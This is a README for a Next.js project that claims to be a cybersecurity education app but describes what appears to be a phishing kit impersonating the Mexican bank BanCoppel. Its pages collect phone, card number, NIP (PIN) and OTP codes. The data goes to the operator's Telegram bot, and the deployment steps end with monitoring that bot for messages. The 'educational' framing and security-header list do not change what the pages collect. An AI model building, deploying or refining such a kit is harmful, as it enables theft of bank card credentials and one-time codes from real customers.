# BCP - BanCoppel Cybersecurity Testing Application

A Next.js application built for cybersecurity testing and educational purposes, demonstrating secure form handling, API security, and Telegram integration.

## 🔒 Security Features

This application implements industry-standard security practices:

- **Security Headers**: HSTS, CSP, X-Frame-Options, X-Content-Type-Options
- **Rate Limiting**: 10 requests per minute per IP address
- **Input Validation**: Client and server-side validation with Luhn algorithm for card numbers
- **HTTPS Enforcement**: Automatic redirect to HTTPS in production
- **No Sensitive Data Exposure**: Environment variables properly secured
- **Return Statement Safety**: All API endpoints properly return to prevent double responses

## 🚀 Getting Started

### Prerequisites

- Node.js 18+ installed
- Telegram account
- npm or yarn package manager

### Installation

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd bcp
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Set up Telegram Bot**
   
   a. Create a bot:
   - Open Telegram and search for [@BotFather](https://t.me/botfather)
   - Send `/newbot` and follow the instructions
   - Copy the bot token you receive
   
   b. Get your Chat ID:
   - Start a chat with your new bot
   - Send any message to it
   - Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Find your `chat.id` in the JSON response

4. **Configure environment variables**
   
   Update `.env.local` with your credentials:
   ```env
   TELEGRAM_BOT_TOKEN=your_actual_bot_token_here
   TELEGRAM_CHAT_ID=your_actual_chat_id_here
   ```

### Running the Application

**Development mode:**
```bash
npm run dev
```

**Production build:**
```bash
npm run build
npm start
```

**Linting:**
```bash
npm run lint
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

## 📁 Project Structure

```
bcp/
├── pages/
│   ├── api/
│   │   └── sender.js         # Telegram API integration
│   ├── index.js               # Initial registration form
│   ├── check.js               # Card verification page
│   ├── verify.js              # OTP verification page
│   └── final.js               # Success page
├── components/
│   └── header.jsx             # Reusable header component
├── utils/
│   ├── validation.js          # Validation utilities (Luhn, etc.)
│   └── constants.js           # Application constants
├── public/
│   └── logo.svg               # BanCoppel logo
├── middleware.js              # Security middleware & rate limiting
├── next.config.mjs            # Next.js configuration
└── .env.local                 # Environment variables (not committed)
```

## 🛡️ Security Implementation

### Rate Limiting
- Implemented in `middleware.js`
- 10 requests per minute per IP
- 429 status code for exceeded limits
- Automatic cleanup of old request logs

### Security Headers
- **HSTS**: Force HTTPS for 2 years
- **CSP**: Content Security Policy to prevent XSS
- **X-Frame-Options**: Prevent clickjacking
- **X-Content-Type-Options**: Prevent MIME sniffing
- **Referrer-Policy**: Control referrer information

### Input Validation
- Phone: 10 digits
- Card: 16 digits with Luhn algorithm validation
- NIP: 4 digits
- OTP: 6 digits
- Age: Must be 18+

### API Security
- Proper return statements (no double responses)
- Request method validation (POST only)
- Input sanitization
- Error handling without sensitive data leakage

## 🔧 Technologies Used

- **Framework**: Next.js 14.2.13
- **UI Library**: Material-UI (MUI) 6.1.1
- **Styling**: Emotion, Bootstrap
- **Form Handling**: Formik + Yup
- **HTTP Client**: Axios
- **Notifications**: SweetAlert2
- **Date Handling**: Day.js

## 📝 API Documentation

### POST /api/sender

Sends a formatted message to Telegram.

**Request Body:**
```json
{
  "message": "Formatted message with data"
}
```

**Response (Success):**
```json
{
  "success": true,
  "message": "Message sent successfully"
}
```

**Response (Error):**
```json
{
  "success": false,
  "message": "Error description"
}
```

**Rate Limit:** 10 requests per minute per IP

## 🎓 Educational Purpose

This project is designed for cybersecurity education and testing. It demonstrates:

1. **Secure API Design**: Proper error handling, validation, and response codes
2. **Rate Limiting**: Preventing abuse and DDoS attacks
3. **Security Headers**: Browser-side security mechanisms
4. **Input Validation**: Client and server-side validation
5. **Secret Management**: Proper use of environment variables
6. **HTTPS Enforcement**: Redirecting HTTP to HTTPS

## ⚠️ Important Notes

- **Never commit `.env.local`**: This file contains sensitive credentials
- **Use HTTPS in production**: The middleware enforces this
- **Monitor Telegram bot**: Check for unusual activity
- **Regular updates**: Keep dependencies updated for security patches

## 📊 Testing Checklist

- [x] Security headers implemented
- [x] Rate limiting functional
- [x] Input validation (client & server)
- [x] Proper return statements in APIs
- [x] Environment variables secured
- [x] HTTPS enforcement
- [x] Luhn algorithm for card validation
- [x] Error handling without data leakage

## 🔐 Deployment

For production deployment:

1. Ensure all environment variables are set
2. Run `npm run build` to create optimized build
3. Deploy to a platform with HTTPS (Vercel, Netlify, etc.)
4. Verify security headers are active
5. Test rate limiting functionality
6. Monitor Telegram bot for messages

## 📄 License

This project is for educational purposes only.

## 🙏 Acknowledgments

Built as a cybersecurity testing project demonstrating secure web application practices.
